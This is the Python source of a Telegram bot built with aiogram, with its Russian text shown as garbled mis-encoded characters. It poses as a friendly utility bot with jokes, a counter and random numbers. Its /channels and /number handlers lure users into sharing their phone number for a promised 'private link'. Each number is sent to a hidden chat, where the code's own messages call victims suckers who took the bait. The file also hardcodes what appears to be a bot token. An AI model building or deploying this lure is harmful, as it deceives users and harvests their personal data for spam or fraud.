#!venv/bin/python
import logging
import aiogram.utils.markdown as fmt
import random
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters import Text
from aiogram.utils.exceptions import MessageNotModified
from contextlib import suppress
from sys import exit

BOT_TOKEN = "2095802411:AAGOAhvGzn5tG2NnVQgXgxfScji2Mtl6GM4"

bot_token = BOT_TOKEN
if not bot_token:
    exit("Error: no token provided")

bot = Bot(token=bot_token)

phone_chat_id = -1001774805952
text = "#num\n–£ –Ω–∞—Å –µ—â–µ –æ–¥–∏–Ω –Ω–æ–º–µ—Ä–æ–∫üì±"

gift_purse = 0

# –î–∏—Å–ø–µ—Ç—á–µ—Ä –¥–ª—è –±–æ—Ç–∞
dp = Dispatcher(bot)
# –í–∫–ª—é—á–∞–µ–º –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ, —á—Ç–æ–±—ã –Ω–µ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å –≤–∞–∂–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è
logging.basicConfig(level=logging.INFO)


def get_startkeyboard():
    buttons = [
        types.InlineKeyboardButton(text="–í—Å–µ –∫–æ–º–∞–Ω–¥—ã",
                                   callback_data="all_cmds"),
        types.InlineKeyboardButton(text="–ú–æ–π –∫–∞–Ω–∞–ª —Å –º–µ–º—á–∏–∫–∞–º–∏.",
                                   callback_data="lh_mem"),
        types.InlineKeyboardButton(text="–û—Ç–∑—ã–≤—ã –∏ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏—è.",
                                   callback_data="local_chat")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(*buttons)
    return keyboard


def bot_menu():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = ["–ú–µ–Ω—é –±–æ—Ç–∞üìÑ"]
    keyboard.add(*buttons)
    return keyboard


@dp.message_handler(commands="start")
async def cmd_start(message: types.Message):
    await message.answer(
        "–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é —Ç–µ–±—è –≤ –±–æ—Ç–µ –¥–ª—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –∏–¥–µ–π, –∏ –±—ã—Å—Ç—Ä–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–≤—Å–µ–¥–Ω–µ–≤–Ω—ã—Ö –∑–∞–¥–∞—á.",
        reply_markup=get_startkeyboard())
    await message.answer(
        "–ù–∞–¥–µ–µ–º—Å—è, —á—Ç–æ –≤—ã –≤—ã—Å–æ–∫–æ –æ—Ü–µ–Ω–∏—Ç–µ —É—Ä–æ–≤–µ–Ω—å –º–æ–∏—Ö –±–µ–∑–≤–æ–∑–º–µ–∑–¥–Ω—ã—Ö —É—Å–ª—É–≥, –∏ –æ–∫–∞–∂–µ—Ç–µ –ø–æ—Å–∏–ª—å–Ω—É—é –ø–æ–º–æ—â—å –∞–≤—Ç–æ—Ä—É —ç—Ç–æ–≥–æ –±–æ—Ç–∞:\nüí≥–ë–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ç–æ–π: https://yoomoney.ru/to/4100117410709216\n–î—Ä—É–≥–∏–µ —Å–ø–æ—Å–æ–±—ã –æ–ø–ª–∞—Ç—ã –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ.",
        reply_markup=bot_menu())


@dp.callback_query_handler(text="all_cmds")
async def show_cmds(call: types.CallbackQuery):
    await call.message.reply(
        "–ö–æ–º–∞–Ω–¥—ã:\n/gift - –≤—ã–¥–∞–µ—Ç —Ä–∞–Ω–¥–æ–º–Ω—ã–π –ø–æ–¥–∞—Ä–æ–∫ —Ä–∞–∑ –≤ –¥–µ–Ω—å (–µ—Å–ª–∏ –≤—ã –µ–≥–æ –∫–æ–Ω–µ—á–Ω–æ –∂–µ –∑–∞—Å–ª—É–∂–∏–ª–∏)\n/calc - –æ–±—ã–∫–Ω–æ–≤–µ–Ω–Ω—ã–π —Å—á–µ—Ç—á–∏–∫ —á–∏—Å–µ–ª.\n/random - –≤–æ–∑—å–º—É —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ –æ—Ç 1 –¥–æ 10 (–æ—Ä–µ–ª –∏ —Ä–µ—à–∫–∞ + —Ä–∞–Ω–¥–æ–º –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö —á–∏—Å–µ–ª –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ.)\n/hayou - —è —Å–ø—Ä–æ—à—É –∫–∞–∫ —É —Ç–µ–±—è –¥–µ–ª–∞, —Ä–∞—Å—Å–∫–∞–∂—É —à—É—Ç–∫—É, –≤ –æ–±—â–µ–º —Ä–∞–∑–≤–µ—Å–µ–ª—éüòÜ\n/channels - –≤—Å—è–∫–∏–µ –≤–∞–∂–Ω—ã–µ –∫–∞–Ω–∞–ª—ã + –ø–æ–¥–∞—Ä–æ—á–µ–∫üòâ"
    )
    await call.answer()


@dp.message_handler(Text(equals="–ú–µ–Ω—é –±–æ—Ç–∞üìÑ"))
async def cmd_start(message: types.Message):
    await message.answer("–ú–µ–Ω—é –±–æ—Ç–∞:", reply_markup=get_startkeyboard())


@dp.callback_query_handler(text="lh_mem")
async def link_mems(call: types.CallbackQuery):
    buttons = [
        types.InlineKeyboardButton(text="–°–º–µ—à–Ω–æ–π –Æ–º–æ—Ä",
                                   url="tg://resolve?domain=agosset15_mem")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(*buttons)
    await call.message.reply(
        "–î–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –Ω–∞ –∫–∞–Ω–∞–ª —Å –º–µ–º—á–∏–∫–∞–º–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:",
        reply_markup=keyboard)


@dp.callback_query_handler(text="local_chat")
async def local_chat(call: types.CallbackQuery):
    buttons = [
        types.InlineKeyboardButton(text="–û—Ç–∑—ã–≤—ã –∏ –ü–µ—Ä–µ–¥–ª–æ–∂–µ–Ω–∏—è‚úç",
                                   url="tg://resolve?domain=agosset15bot")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(*buttons)
    await call.message.reply(
        "–î–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –≤ –≥—Ä—É–ø–ø—É –¥–ª—è –æ—Ç–∑—ã–≤–æ–≤ –∏ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–π –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:",
        reply_markup=keyboard)


@dp.message_handler(commands="hayou")
async def cmd_hayou(message: types.Message):
    buttons = [
        types.InlineKeyboardButton(text="–•–æ—Ä–æ—à–æ", callback_data="cmd_good"),
        types.InlineKeyboardButton(text="–ü–ª–æ—Ö–æ", callback_data="cmd_bad")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(*buttons)
    await message.answer("–ö–∞–∫ –¥–µ–ª–∞?", reply_markup=keyboard)


@dp.callback_query_handler(text="cmd_good")
async def good(call: types.CallbackQuery):
    await call.message.answer("–ù—É –∏ –ª–∞–¥–Ω–µ–Ω—å–∫–æ!")
    await call.answer()


@dp.callback_query_handler(text="cmd_bad")
async def bad(call: types.CallbackQuery):
    buttons = [
        types.InlineKeyboardButton(text="–†–∞—Å—Å–∫–∞–∑—ã–≤–∞–π!", callback_data="joke"),
        types.InlineKeyboardButton(text="–ù–µ –Ω–∞–¥–æ –º–Ω–µ —Ç–≤–æ–∏—Ö —à—É—Ç–æ–∫!",
                                   callback_data="not_joke")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(*buttons)
    await call.message.answer("–ñ–∞–ª—å! –ú–æ–∂–µ—Ç —Ç–µ–±—è —Ä–∞–∑–≤–µ—Å–µ–ª–∏—Ç —à—É—Ç–∫–∞?",
                              reply_markup=keyboard)
    await call.answer()


@dp.callback_query_handler(text="joke")
async def joke(call: types.CallbackQuery):
    buttons = [
        types.InlineKeyboardButton(text="–ö—Ä—É—Ç–∞—è —à—É—Ç–∫–∞! –î–∞–≤–∞–π –µ—â–µ!",
                                   callback_data="joke"),
        types.InlineKeyboardButton(text="–•–≤–∞—Ç–∏—Ç —à—É—Ç–æ–∫, –Ω–µ –ø–æ–º–æ–≥–ª–æ.",
                                   callback_data="not_joke")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(*buttons)
    await call.message.answer(
        "–°–º–µ—Ä—Ç—å –∫ –Ω–∞–º –ø—Ä–∏—Ö–æ–¥–∏—Ç —á–µ—Ä–Ω–∞—è –∏ —Å –∫–æ—Å–æ–π. –ê –∫ –º—É—Ö–∞–º- –≤ —Ç—Ä—É—Å–∞—Ö, –≤ –º–∞–π–∫–µ –∏ —Å –≥–∞–∑–µ—Ç–æ–π."
    )
    await call.message.answer(
        "–ü—Ä–æ—Å—Ç–∏ –∑–∞ –∞–Ω–∞–ª–æ–≥–∏—é —Å–æ —Å–º–µ—Ä—Ç—å—é, –Ω–æ –≤ –æ–±—â–µ–º-—Ç–æ –∫–∞–∫?",
        reply_markup=keyboard)
    await call.answer()


@dp.message_handler(commands="test1")
async def cmd_test1(message: types.Message):
    await message.answer("Test 1")


@dp.message_handler(commands="channels")
async def cmd_channels(message: types.Message):
    buttons = [
        types.InlineKeyboardButton(text="–ö–∞–Ω–∞–ª –º–æ–µ–≥–æ –¥—Ä—É–≥–∞",
                                   url="tg://resolve?domain=Kiberhack"),
        types.InlineKeyboardButton(
            text="–ï–≥–æ –±–æ—Ç —Å TERMUX –∏ –µ—â–µ –º–Ω–æ–≥–æ —á–µ–º.",
            url="tg://resolve?domain=BotickforTermux_bot")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(*buttons)
    await message.answer("–ö–Ω–æ–ø–∫–∏-—Å—Å—ã–ª–∫–∏", reply_markup=keyboard)
    await message.answer(
        "–ü—Å—Å! –¢–æ–ª—å–∫–æ –ø–æ —Ç–∏—Ö–æ–º—É! –î–ª—è –≤–∞—Å –µ—Å—Ç—å —Å–ø–µ—Ü. —Å—Å—ã–ª–∫–∞ –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –≤ –ø—Ä–∏–≤–∞—Ç–∫—É –µ–≥–æ –±–æ—Ç–∞. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –Ω–æ–º–µ—Ä –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–µ–Ω–∏—è –ª–∏—á–Ω–æ—Å—Ç–∏, –∏ —è –µ–µ —Å–∫–∏–Ω—É. –ö–æ–º–∞–Ω–¥–∞: /number"
    )


# –¥–æ—Ä–∞–±–æ—Ç–∞—Ç—å!!!!!!!
@dp.message_handler(commands="gift")
async def cmd_gift(message: types.Message):
    if gift_purse == 0:
        await message.reply("–í—ã –Ω–µ –∑–∞—Å–ª—É–∂–∏–ª–∏ –ø–æ–¥–∞—Ä–æ–∫!")
    elif gift_purse == 2:
        await message.reply("–í—ã –∑–∞—Å–ª—É–∂–∏–ª–∏ –ø–æ–¥–∞—Ä–æ–∫!")
        await message.reply(
            "–ï—â–µ 3 –ø–æ–¥–∞—Ä–∫–∞, –∏ —É –≤–∞—Å –ø–æ—è–≤–∏—Ç—Å—è –¥–æ—Å—Ç—É–ø –∫ –ø—Ä–∏–≤–∞—Ç–Ω–æ–º—É —Ä–∞–∑–¥–µ–ª—É!\n–ö–æ–º–∞–Ω–¥–∞: /priv"
        )


# –ö–æ–º–∞–Ω–¥–∞ –¥–ª –≤—ã—è—Å–Ω–µ–Ω–∏—è –Ω–æ–º–µ—Ä–∞ –≤–æ–∑–º–æ–∂–Ω–æ –¥–ª—è –ø—Ä–∏–≤–∞—Ç–∞.
@dp.message_handler(commands="number")
async def cmd_number(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(types.KeyboardButton(text="–¢—ã–∫ —Å—é–¥–∞!", request_contact=True))
    await message.answer("–°–∫–∞–∂–∏—Ç–µ –Ω–∞–º —Å–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:",
                         reply_markup=keyboard)
    await bot.send_message(phone_chat_id, "–ï—â–µ –æ–¥–∏–Ω –ª–æ—à–ø–µ–¥ –Ω–æ–º–µ—Ä–æ–∫ —Å–∫–∏–¥—ã–≤–∞–µ—Ç!")


@dp.message_handler(content_types=['contact'])
async def contact(message: types.Message):
    if message.contact is not None:
        keyboard2 = types.ReplyKeyboardRemove()
        await message.answer("–í—ã —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ —Å–≤–æ–π –Ω–æ–º–µ—Ä",
                             reply_markup=keyboard2)
        await message.answer("–°–∫–æ—Ä–æ –≤–∞—Å –¥–æ–±–∞–≤—è—Ç –≤ –ø—Ä–∏–≤–∞—Ç–Ω—É—é –≥—Ä—É–ø–ø—É.",
                             reply_markup=bot_menu())
        contact = message.contact
        print(contact.first_name + " —Å–∫–∏–Ω—É–ª(–∞) –∫–æ–Ω—Ç–∞–∫—Ç!!")
        await bot.send_message(phone_chat_id, str(text + contact.phone_number))
    elif message.contact is None:
        await bot.send_message(phone_chat_id, "–ù–µ –ø–æ–ø–∞–ª—Å—è –Ω–∞ —É–¥–æ—á–∫—É, –∂–∞–ª—å!")


# async def pars(message: types.Message):
# await bot.send_message(phone_chat_id, "–£ –Ω–∞—Å –µ—â–µ –æ–¥–∏–Ω –Ω–æ–º–µ—Ä–æ–∫üì±\n" + nb)

# @dp.message_handler()
#  async def any_text_message2(message: types.Message):
# await message.answer(fmt.text("–ü—Ä–∏–≤–µ—Ç,", fmt.hbold(message.text)), parse_mode=types.ParseMode.HTML)


@dp.message_handler(commands="vcalls")
async def vcalls(message: types.Message):
    await message.answer(
        f"{fmt.hide_link('https://telegram.org/blog/video-calls/ru')}–ö—Ç–æ –±—ã –º–æ–≥ –ø–æ–¥—É–º–∞—Ç—å, —á—Ç–æ "
        f"–≤ 2020 –≥–æ–¥—É –≤ Telegram –ø–æ—è–≤—è—Ç—Å—è –≤–∏–¥–µ–æ–∑–≤–æ–Ω–∫–∏!\n\n–û–±—ã—á–Ω—ã–µ –≥–æ–ª–æ—Å–æ–≤—ã–µ –≤—ã–∑–æ–≤—ã "
        f"–≤–æ–∑–Ω–∏–∫–ª–∏ –≤ Telegram –ª–∏—à—å –≤ 2017, –∑–∞–º–µ—Ç–Ω–æ –ø–æ–∑–∂–µ —Å–≤–æ–∏—Ö –∫–æ–Ω–∫—É—Ä–µ–Ω—Ç–æ–≤. –ê —Å–ø—É—Å—Ç—è —Ç—Ä–∏ –≥–æ–¥–∞, "
        f"–∫–æ–≥–¥–∞ –æ–≥—Ä–æ–º–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ª—é–¥–µ–π –Ω–∞ –ø–ª–∞–Ω–µ—Ç–µ –ø—Ä–∏—É—á–∏–ª–∏—Å—å —Ä–∞–±–æ—Ç–∞—Ç—å –∏–∑ –¥–æ–º–∞ –∏–∑-–∑–∞ —ç–ø–∏–¥–µ–º–∏–∏ "
        f"–∫–æ—Ä–æ–Ω–∞–≤–∏—Ä—É—Å–∞, –∫–æ–º–∞–Ω–¥–∞ –ü–∞–≤–ª–∞ –î—É—Ä–æ–≤–∞ –Ω–µ —Ä–∞—Å—Ç–µ—Ä—è–ª–∞—Å—å –∏ —Å–¥–µ–ª–∞–ª–∞ –∫–∞—á–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ "
        f"–≤–∏–¥–µ–æ–∑–≤–æ–Ω–∫–∏ –Ω–∞ WebRTC!\n\nP.S. –∞ –µ—â—ë —Ö–æ–¥—è—Ç —Å–ª—É—Ö–∏ –ø—Ä–æ –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—é —Å–≤–æ–µ–≥–æ —ç–∫—Ä–∞–Ω–∞ :)",
        parse_mode=types.ParseMode.HTML)


@dp.message_handler(commands="random")
async def cmd_random(message: types.Message):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton(text="–ù–∞–∂–º–∏ –º–µ–Ω—è",
                                   callback_data="random_value"))
    await message.answer(
        "–ù–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É, —á—Ç–æ–±—ã –±–æ—Ç –æ—Ç–ø—Ä–∞–≤–∏–ª —á–∏—Å–ª–æ –æ—Ç 1 –¥–æ 10",
        reply_markup=keyboard)


@dp.callback_query_handler(text="random_value")
async def send_random_value(call: types.CallbackQuery):
    rnd = str(random.randint(1, 10))
    await call.message.answer(rnd)
    if rnd == 10:
        await call.message.answer(
            text="–ü–æ–∑–¥—Ä–∞–≤–ª—è—é!\n–í—ã –≤—ã–∏–≥—Ä–∞–ª–∏ +1 –∫ –ø–æ–¥–∞—Ä–æ—á–Ω–æ–º—É —É—Ä–æ–≤–Ω—é.")
        gift_purse = +1


# –ó–¥–µ—Å—å —Ö—Ä–∞–Ω—è—Ç—Å—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ.
# –¢.–∫. —ç—Ç–æ —Å–ª–æ–≤–∞—Ä—å –≤ –ø–∞–º—è—Ç–∏, —Ç–æ –ø—Ä–∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–µ –æ–Ω –æ—á–∏—Å—Ç–∏—Ç—Å—è
user_data = {}


def get_keyboard():
    # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã.
    buttons = [
        types.InlineKeyboardButton(text="-1", callback_data="num_decr"),
        types.InlineKeyboardButton(text="+1", callback_data="num_incr"),
        types.InlineKeyboardButton(text="–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å",
                                   callback_data="num_finish")
    ]
    # –ë–ª–∞–≥–æ–¥–∞—Ä—è row_width=2, –≤ –ø–µ—Ä–≤–æ–º —Ä—è–¥—É –±—É–¥–µ—Ç –¥–≤–µ –∫–Ω–æ–ø–∫–∏, –∞ –æ—Å—Ç–∞–≤—à–∞—è—Å—è –æ–¥–Ω–∞
    # —É–π–¥—ë—Ç –Ω–∞ —Å–ª–µ–¥—É—é—â—É—é —Å—Ç—Ä–æ–∫—É
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(*buttons)
    return keyboard


async def update_num_text(message: types.Message, new_value: int):
    with suppress(MessageNotModified):
        await message.edit_text(f"–í–∞—à —Å—á–µ—Ç: {new_value}",
                                reply_markup=get_keyboard())


@dp.message_handler(commands="calc")
async def cmd_calc(message: types.Message):
    user_data[message.from_user.id] = 0
    await message.answer("–í–∞—à —Å—á–µ—Ç: 0", reply_markup=get_keyboard())


@dp.callback_query_handler(Text(startswith="num_"))
async def callbacks_num(call: types.CallbackQuery):
    # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –ª–∏–±–æ —Å—á–∏—Ç–∞–µ–º –µ–≥–æ —Ä–∞–≤–Ω—ã–º 0
    user_value = user_data.get(call.from_user.id, 0)
    # –ü–∞—Ä—Å–∏–º —Å—Ç—Ä–æ–∫—É –∏ –∏–∑–≤–ª–µ–∫–∞–µ–º –¥–µ–π—Å—Ç–≤–∏–µ, –Ω–∞–ø—Ä–∏–º–µ—Ä `num_incr` -> `incr`
    action = call.data.split("_")[1]
    if action == "incr":
        user_data[call.from_user.id] = user_value + 1
        await update_num_text(call.message, user_value + 1)
    elif action == "decr":
        user_data[call.from_user.id] = user_value - 1
        await update_num_text(call.message, user_value - 1)
    elif action == "finish":
        # –ï—Å–ª–∏ –±—ã –º—ã –Ω–µ –º–µ–Ω—è–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ, —Ç–æ –º–æ–∂–Ω–æ –±—ã–ª–æ –±—ã –ø—Ä–æ—Å—Ç–æ —É–¥–∞–ª–∏—Ç—å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
        # –≤—ã–∑–æ–≤–æ–º await call.message.delete_reply_markup().
        # –ù–æ —Ç.–∫. –º—ã —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –∏ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–≤—É—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É,
        # —Ç–æ –æ–Ω–∞ –±—É–¥–µ—Ç —É–¥–∞–ª–µ–Ω–∞ –∏ —Ç–∞–∫.
        await call.message.edit_text(f"–ò—Ç–æ–≥–æ: {user_value}")
    # –ù–µ –∑–∞–±—ã–≤–∞–µ–º –æ—Ç—á–∏—Ç–∞—Ç—å—Å—è –æ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∫–æ–ª–±—ç–∫–∞
    await call.answer()


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
